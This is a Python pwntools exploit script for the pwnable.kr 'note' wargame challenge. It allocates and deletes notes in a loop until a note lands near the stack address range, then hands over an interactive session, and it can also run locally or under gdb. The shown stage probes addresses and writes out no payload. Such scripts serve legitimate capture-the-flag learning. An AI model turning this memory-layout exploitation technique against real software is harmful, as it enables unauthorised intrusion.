from pwn import *
import argh


context.log_level = 'debug'
bin_path = './note'
e = ELF(bin_path)


ADDR = 'pwnable.kr'
PORT = 9019


gdbscript = '''
layout regs
continue
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], gdbscript=gdbscript)


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--debug', '-d', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, debug=False, runpwn=False):
    p = None

    if local:
        p = process(bin_path)
    elif debug:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)
    else:
        log.critical('no run instruction given!!')
        log.critical('shutting down...')
        return

    received_addrs = []
    while True:
        p.recvuntil('5. exit')
        p.sendline('1')
        p.recvuntil(' [')
        note_addr = int(p.recvuntil(']', drop=True), base=16)
        if note_addr in received_addrs:
            log.info('a note that was already in. prev_index: {}, curr_index: {}, addr: {}'.format(received_addrs.index(note_addr), len(received_addrs), note_addr))
        else:
            received_addrs.append(note_addr)

        if -4096 < note_addr - 0xffffd000 < 0x1000:
            log.info('addr: {}'.format(note_addr))
            p.interactive()
        else:
            p.recvuntil('5. exit')
            p.sendline('4')
            p.recvuntil('note no?\n')
            p.sendline('0')
    print(received_addrs)


    p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

